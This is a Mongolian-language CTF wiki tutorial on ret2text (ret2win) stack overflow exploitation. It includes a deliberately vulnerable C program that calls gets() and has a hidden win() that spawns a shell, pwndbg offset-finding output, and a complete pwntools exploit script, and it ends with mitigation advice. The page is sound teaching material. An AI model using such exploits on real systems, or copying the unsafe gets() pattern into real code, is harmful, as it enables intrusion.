---
title: ret2text (ret2win)
description: Stack overflow ашиглан программын өөрийн код (.text) руу үсрэх хамгийн энгийн ROP арга.
---

**ret2text** (return-to-text) нь **stack overflow** ашиглан функцийн **буцах хаяг (return address)**-ийг дарж бичиж,
программ дотор **аль хэдийн байгаа** кодын хэсэг рүү үсрэх арга юм. Нэр нь ELF файлын `.text`
хэсгээс гаралтай — программын машин код тэнд байрладаг.

Ихэнх CTF бодлогод `win()`, `flag()`, `shell()` гэх мэт хэзээ ч дуудагддаггүй функц
байдаг. Иймээс ret2text-ийг **ret2win** гэж бас нэрлэдэг.

:::note[Суурь мэдлэг]
- C хэлний үндэс, `gets()`/`read()` зэрэг функц
- x86-64 assembly-ийн суурь (`push`, `call`, `leave`, `ret`)
- `gdb` (pwndbg эсвэл GEF) — анх удаа ашиглаж байвал [pwndbg үндэс](../tools/gdb/) хуудсыг уншаарай
- Python-ий `pwntools` — анх удаа ашиглаж байвал [pwntools үндэс](../tools/pwntools/) хуудсыг уншаарай
:::

## Санаа

Функц дуудагдах үед stack дээр дараах бүтэц үүснэ (64-bit):

![Функцийн stack frame: дээрээс доош return address (8 B, rbp + 8), saved rbp (8 B, rbp), char buf[...] (buf). gets() өгөгдлийг buf-аас эхлээд их хаяг руу бичдэг тул return address-ийг дарж бичиж чадна.](../../../assets/pwn/ret2text-stack.svg)

`gets()` шиг урт шалгадаггүй функц `buf`-аас илүү өгөгдөл хүлээж авбал өгөгдөл **дээшээ** (их хаяг руу)
урсаж, `saved rbp`, улмаар `return address`-ийг дарна. Функц `ret` заавар гүйцэтгэх үед CPU stack-ийн оройгоос
хаягийг аваад тийш үсэрдэг — тэр хаяг одоо **бидний сонгосон** хаяг болсон байна.

Тиймээс халдлагын өгөгдөл (payload) ердөө хоёр хэсэгтэй:

```ansi
[32m[ buf ................ ][0m[33m[ saved rbp ][0m[1;31m[    зорилтот хаяг    ][0m
[90m└──────── padding (offset) ─────────┘└── return address ───┘[0m
```

Бидэнд хоёр зүйл л олох хэрэгтэй:

1. **Offset** — `buf`-ийн эхнээс return address хүртэл хэдэн байт байгаа вэ?
2. **Зорилтот хаяг** — хаашаа үсрэх вэ?

ret2text ажиллах нөхцөл:

| Хамгаалалт | Шаардлага | Яагаад |
|------------|-----------|--------|
| Stack canary | **Байхгүй** | Canary байвал overflow-ийг `ret`-ээс өмнө илрүүлээд программыг зогсооно |
| PIE | **Байхгүй** (эсвэл хаяг leak хийсэн) | PIE байвал `.text`-ийн хаяг ажиллах бүрт өөрчлөгдөнө |
| NX | Хамаагүй | Бид shellcode ажиллуулахгүй, байгаа кодыг л ашиглана |

Хамгаалалт бүрийн дэлгэрэнгүйг [Хамгаалалтууд](../basics/protections/) хуудаснаас үзээрэй.

## Бодлого

Бүх файл [`challenges/pwn/ret2text`](https://github.com/computer-communication-security-club/ctf-wiki/tree/main/challenges/pwn/ret2text) хавтсанд байна:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/main.c) | Эх код |
| [`ret2text`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/ret2text/ret2text) | Бэлэн binary (Ubuntu 24.04 дээр compile хийсэн) |
| [`Dockerfile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/Dockerfile) | Challenge сервер (deploy) |
| [`Makefile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/ret2text/Makefile) | `make run`, `make stop` |

:::tip
Бэлэн binary-г ашиглавал энэ хуудсан дээрх хаягууд (gdb гаралт гэх мэт) таных яг ижил гарна.
Өөрөө `gcc`-ээр compile хийвэл compiler-ийн хувилбараас хамаарч хаяг өөр байж болно.
:::

Challenge-ийг сервер хэлбэрээр ажиллуулах (Docker хэрэгтэй):

```console
$ cd challenges/pwn/ret2text
$ make run      # localhost:1337 дээр асна
$ nc localhost 1337
What is your name?
$ make stop     # зогсоох
```

Repo татахгүйгээр бэлэн image-ийг шууд ажиллуулж болно:

```console
$ docker run --rm -p 1337:1337 ghcr.io/computer-communication-security-club/pwn-ret2text
```

:::caution[Spoiler]
Доорх хэсэгт бодолт байгаа. Эхлээд өөрөө оролдоод үзээрэй!
:::

## Шийдэл

### 1. Эх код

```c title="main.c"
#include <stdio.h>
#include <stdlib.h>

char *gets(char *s); // шинэ glibc-ийн header-аас gets() хасагдсан

void win(void) {
    puts("Congrats! Here is your shell:");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    puts("What is your name?");
    gets(buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("Bye!");
    return 0;
}
```

Хоёр зүйл анхаарал татна:

- `vuln()` дотор `gets(buf)` — урт шалгахгүй тул **stack overflow** байна.
- `win()` функц `system("/bin/sh")` дууддаг ч программ үүнийг **хэзээ ч дууддаггүй**.

Зорилго: `vuln()`-ийн return address-ийг `win()`-ийн хаягаар дарж бичих.

### 2. Хамгаалалт шалгах

```console
$ checksec --file=ret2text
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Canary байхгүй, PIE байхгүй — ret2text хийхэд тохиромжтой. Binary-г дараах флагуудаар compile хийсэн:

```console
$ gcc main.c -o ret2text -fno-stack-protector -no-pie
```

- `-fno-stack-protector` — canary-г унтраана
- `-no-pie` — `.text`-ийн хаягийг тогтмол болгоно

### 3. Зорилтот хаяг олох

pwndbg-ээр binary-г нээгээд `info functions` (`info fu`) командаар бүх функцийг жагсаана:

```ansi
$ gdb ./ret2text
[1;31mpwndbg>[0m info fu
All defined functions:

Non-debugging symbols:
[34m0x0000000000401000[0m  [33m_init[0m
[34m0x0000000000401070[0m  [33mputs@plt[0m
[34m0x0000000000401080[0m  [33msystem@plt[0m
[34m0x0000000000401090[0m  [33mgets@plt[0m
[34m0x00000000004010a0[0m  [33msetvbuf@plt[0m
[34m0x00000000004010b0[0m  [33m_start[0m
[34m0x00000000004010e0[0m  [33m_dl_relocate_static_pie[0m
[34m0x00000000004010f0[0m  [33mderegister_tm_clones[0m
[34m0x0000000000401120[0m  [33mregister_tm_clones[0m
[34m0x0000000000401160[0m  [33m__do_global_dtors_aux[0m
[34m0x0000000000401190[0m  [33mframe_dummy[0m
[34m0x0000000000401196[0m  [33mwin[0m
[34m0x00000000004011bf[0m  [33mvuln[0m
[34m0x00000000004011e9[0m  [33mmain[0m
[34m0x000000000040122c[0m  [33m_fini[0m
```

Зорилтот хаяг: **`0x401196`**. pwntools дээр `exe.sym.win` гэж автоматаар авна.

:::tip
Зорилтот хаяг заавал функцийн эхлэл байх албагүй. Функцийн **дунд** байгаа ямар ч зааврын хаяг руу үсэрч болно.
Жишээ нь шалгалт (`if`) бүхий функцэд шалгалтын дараах хаяг руу шууд үсэрч нөхцөлийг алгасаж болно.
:::

### 4. Offset олох

Offset-ийг хоёр аргаар олж болно: assembly-аас **тооцоолох**, эсвэл gdb-ээр **шууд олох**.
Эхнийх нь stack хэрхэн ажилладгийг ойлгоход, хоёр дахь нь хурдан шалгахад тохиромжтой.

#### Арга 1: Assembly-аас тооцоолох

`vuln()`-ийг disassemble хийнэ:

```ansi
[1;31mpwndbg>[0m disassemble vuln
Dump of assembler code for function [33mvuln[0m:
   [34m0x00000000004011bf[0m <+0>:	[32mendbr64[0m
   [34m0x00000000004011c3[0m <+4>:	[32mpush   [0m[31mrbp[0m
   [34m0x00000000004011c4[0m <+5>:	[32mmov    [0m[31mrbp[0m,[31mrsp[0m
   [34m0x00000000004011c7[0m <+8>:	[32msub    [0m[31mrsp[0m,[34m0x40[0m
   [34m0x00000000004011cb[0m <+12>:	[32mlea    [0m[31mrax[0m,[[31mrip[0m+[34m0xe58[0m][90m        # [0m[90m0x40202a[0m
   [34m0x00000000004011d2[0m <+19>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011d5[0m <+22>:	[32mcall   [0m[34m0x401070[0m <[33mputs@plt[0m>
   [34m0x00000000004011da[0m <+27>:	[32mlea    [0m[31mrax[0m,[[31mrbp[0m[34m-[0m[34m0x40[0m]
   [34m0x00000000004011de[0m <+31>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011e1[0m <+34>:	[32mcall   [0m[34m0x401090[0m <[33mgets@plt[0m>
   [34m0x00000000004011e6[0m <+39>:	[32mnop[0m
   [34m0x00000000004011e7[0m <+40>:	[32mleave[0m
   [34m0x00000000004011e8[0m <+41>:	[32mret[0m
End of assembler dump.
```

Хоёр газрыг харна:

- `sub rsp,0x40` — локал хувьсагчдад stack дээр **0x40 (64)** байт зай гаргана.
- `lea rax,[rbp-0x40]` → `mov rdi,rax` → `call gets` — `gets()`-ийн эхний аргумент (`rdi`) нь `buf`-ийн хаяг.
  Тэгэхээр `buf` нь **`rbp - 0x40`**-д эхэлнэ.

Дээрх [stack-ийн зураг](#санаа)-аас `saved rbp` нь `rbp`-д, return address нь `rbp + 8`-д байдгийг мэдэж байгаа:

![buf нь rbp − 0x40-д эхэлнэ (64 байт), дээр нь saved rbp (8 байт, rbp-д), дараа нь return address (rbp + 8). buf-аас return address хүртэл 64 + 8 = 72 байт.](../../../assets/pwn/ret2text-offset.svg)

```
offset = (rbp + 8) − (rbp − 0x40) = 0x40 + 8 = 72
```

:::caution
C код дахь `char buf[64]`-ийн хэмжээнд найдаж болохгүй. Compiler alignment-ийн улмаас эсвэл
бусад локал хувьсагчаас болж `buf` болон `rbp`-ийн хоорондох зай өөр байж болно. Үргэлж
assembly-аас (`[rbp-0x??]`) уншаарай.
:::

#### Арга 2: gdb-ээр олох (cyclic pattern)

Тооцоолохгүйгээр pwndbg-ээр шууд олж болно. Санаа нь: давтагдашгүй **cyclic pattern**-ийг
программд өгөөд, программ унах үед return address-ийн байранд pattern-ийн аль хэсэг очсоныг харах.

**1. Pattern үүсгээд программыг ажиллуулна.** Нэр асуухад pattern-ийг хуулж оруулна:

```ansi
[1;31mpwndbg>[0m !pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[1;31mpwndbg>[0m r
Starting program: ./ret2text
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
What is your name?

Program received signal [31mSIGSEGV[0m, Segmentation fault.
[31m0x00000000004011e8[0m in vuln ()
```

**2. Context-ийг уншина.** Программ `SIGSEGV`-ээр унахад pwndbg бүх мэдээллийг харуулна:

```ansi
LEGEND: [33mSTACK[0m | [34mHEAP[0m | [31mCODE[0m | [35mDATA[0m | [31mWX[0m | RODATA
[34m───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────[0m
 [1mRAX[0m  [33m0x7fffffffd940[0m ◂— 0x6161616261616161 ('aaaabaaa')
 [1mRBX[0m  0
 [1mRCX[0m  [35m0x7ffff7e14760 (_IO_stdfile_0_lock)[0m ◂— 0
 [1mRDX[0m  [35m0x7ffff7e14760 (_IO_stdfile_0_lock)[0m ◂— 0
 [1mRDI[0m  [33m0x7fffffffd941[0m ◂— 'aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 [1mRSI[0m  [34m0x405011[0m ◂— 0x6361616162616161 ('aaabaaac')
 [1mR8[0m   [34m0x4050d9[0m ◂— 0
 [1mR9[0m   0xfbad2288
 [1mR10[0m  0
 [1mR11[0m  0x202
 [1mR12[0m  [33m0x7fffffffdac8[0m —▸ [33m0x7fffffffdea6[0m ◂— './ret2text'
 [1mR13[0m  1
 [1mR14[0m  [35m0x7ffff7ffd000 (_rtld_global)[0m —▸ [35m0x7ffff7ffe2e0[0m ◂— 0
 [1mR15[0m  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ [31m0x401160 (__do_global_dtors_aux)[0m ◂— endbr64
 [1mRBP[0m  0x6161617261616171 ('qaaaraaa')
 [1mRSP[0m  [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 [1mRIP[0m  [31m0x4011e8 (vuln+41)[0m ◂— ret
[34m────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────[0m
[90m   0x4011e1 <vuln+34>    call   gets@plt                    <gets@plt>[0m
[90m   0x4011e6 <vuln+39>    nop[0m
[90m   0x4011e7 <vuln+40>    leave[0m
[1;32m ► [0m[31m0x4011e8[0m <vuln+41>    [32mret[0m                                <0x6161617461616173>
    ↓
[34m─────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────[0m
00:0000│ [1mrsp[0m [33m0x7fffffffd988[0m ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0008│     [33m0x7fffffffd990[0m ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0010│     [33m0x7fffffffd998[0m ◂— 'waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:0018│     [33m0x7fffffffd9a0[0m ◂— 'yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0020│     [33m0x7fffffffd9a8[0m ◂— 'baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0028│     [33m0x7fffffffd9b0[0m ◂— 'daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0030│     [33m0x7fffffffd9b8[0m ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:0038│     [33m0x7fffffffd9c0[0m ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
[34m───────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────[0m
 [1;32m►[0m 0 [31m0x4011e8[0m           vuln+41
   1 0x6161617461616173
   2 0x6161617661616175
   3 0x6161617861616177
   4 0x6261617a61616179
   5 0x6261616362616162
   6 0x6261616562616164
   7 0x6261616762616166
[34m──────────────────────────────────────────[ LAST SIGNAL ]───────────────────────────────────────────[0m
Program received signal [31mSIGSEGV[0m (fault address: 0x0).
[34m────────────────────────────────────────────────────────────────────────────────────────────────────[0m
```

- **DISASM** — программ `vuln`-ийн `ret` заавар дээр унасан. `ret` нь `0x6161617461616173` хаяг руу буцах гэж оролдсон.
  Энэ бол бидний pattern (`'saaataaa'`) — return address дарагдсан гэсэн үг.
- **RSP** — stack-ийн орой `'saaataaa...'` байна. `ret` яг энэ утгыг буцах хаяг болгон авдаг.
- **RBP** — `'qaaaraaa'`: `saved rbp` ч мөн дарагдсан.

**3. Stack-ийн оройн 4 байтыг уншина:**

```ansi
[1;31mpwndbg>[0m x/x $rsp
[33m0x7fffffffd988[0m:    0x61616173
```

**4. Offset-ийг хайна.** `0x61616173` (`'saaa'`) pattern-ийн хэддүгээр байтаас эхэлдгийг `cyclic -l`-ээр олно:
`!pwn cyclic -l 0x61616173` → **72**.

Хоёр арга ижил хариу өгнө — offset = **72**: эхний 72 байт `buf` болон `saved rbp`-г дүүргэж, дараагийн 8 байт return address болно.

### 5. Stack alignment (movaps асуудал)

Эхлээд хамгийн энгийн payload-ийг туршъя:

```python
payload = b'A' * 72 + p64(exe.sym.win)
```

`win()` руу үсэрч, `"Congrats!"` хэвлэгдэх ч **shell нээгдэхгүй**, `system()` дотор segfault болно.

Шалтгаан: x86-64 System V ABI-ийн дагуу `call` хийх үед `rsp` **16 байтад тэгшлэгдсэн** байх ёстой.
glibc-ийн `system()` дотор `movaps` заавар байдаг бөгөөд тэгшлэгдээгүй хаяг дээр унадаг.
Бид функцийг `call`-аар биш `ret`-ээр эхлүүлсэн тул stack 8 байтаар зөрсөн.

Шийдэл: `win`-ийн өмнө нэг **`ret` gadget** нэмэх. Энэ нь юу ч хийхгүй, зөвхөн stack-ийг 8 байтаар
шилжүүлж тэгшилнэ.

:::tip
Өөр нэг арга: `win`-ийн эхний `endbr64` (4 байт) ба `push rbp` (1 байт)-ийг алгасаж
`exe.sym.win + 5` (`0x40119b`) руу үсрэх. `push` хийгдэхгүй тул бас 8 байтын зөрүү засагдана.
:::

### 6. Exploit

`pwn template`-ээр бэлдэц үүсгэнэ (дэлгэрэнгүйг [pwntools үндэс](../tools/pwntools/#pwn-template) хуудаснаас):

```console
$ pwn template ./ret2text --host localhost --port 1337 --quiet > exploit.py
$ chmod +x exploit.py
```

`# -- Exploit goes here --` хэсэгт payload-оо нэмнэ (тодруулсан мөрүүд):

```python title="exploit.py" ins={39-46,49}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './ret2text')

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

offset = 72
ret = ROP(exe).find_gadget(['ret'])[0]   # stack-ийг 16 байтад тэгшлэх

payload = flat(
    b'A' * offset,   # buf + saved rbp
    ret,             # alignment
    exe.sym.win,     # win() функцийн хаяг
)

io = start()
io.sendlineafter(b'name?\n', payload)
io.interactive()
```

Эхлээд өөрийн машин дээр (`LOCAL`) туршина:

```console
$ ./exploit.py LOCAL
[*] Switching to interactive mode
Congrats! Here is your shell:
$ cat flag.txt
```

Сервер рүү нэмэлт `option` гүй ашиглаж болно. — скриптийг өөрчлөх шаардлагагүй:

```console
$ ./exploit.py                    # make run-аар асаасан localhost:1337
$ ./exploit.py HOST=ctf.example.com PORT=31337
```

:::tip
Shell нээгдэхгүй байвал `./exploit.py LOCAL DEBUG`-ээр илгээсэн байтуудыг харах,
эсвэл `./exploit.py LOCAL GDB`-ээр gdb дотор алхам алхмаар шалгаарай.
:::

`p64()`/`flat()` нь хаягийг **little-endian** 8 байт болгоно: `0x401196` → `\x96\x11\x40\x00\x00\x00\x00\x00`.
`exe.sym.win` нь хаягийг symbol table-аас автоматаар авдаг тул дахин compile хийсэн ч скрипт ажиллана.

## Хамгаалалт

- `gets()`-ийг **хэзээ ч** бүү ашигла — `fgets(buf, sizeof(buf), stdin)` ашигла.
- Stack canary (`-fstack-protector-strong`, ихэнх distro-д анхнаасаа идэвхтэй).
- PIE + ASLR (`-pie`, мөн анхнаасаа идэвхтэй) — хаягийг таамаглахад хэцүү болгоно.

## Эх сурвалж

- [CTF Wiki — Basic ROP: ret2text](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text)
- [ir0nstone — ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win)
- [ir0nstone — De Bruijn Sequences](https://ir0nstone.gitbook.io/notes/binexp/stack/de-bruijn-sequences)
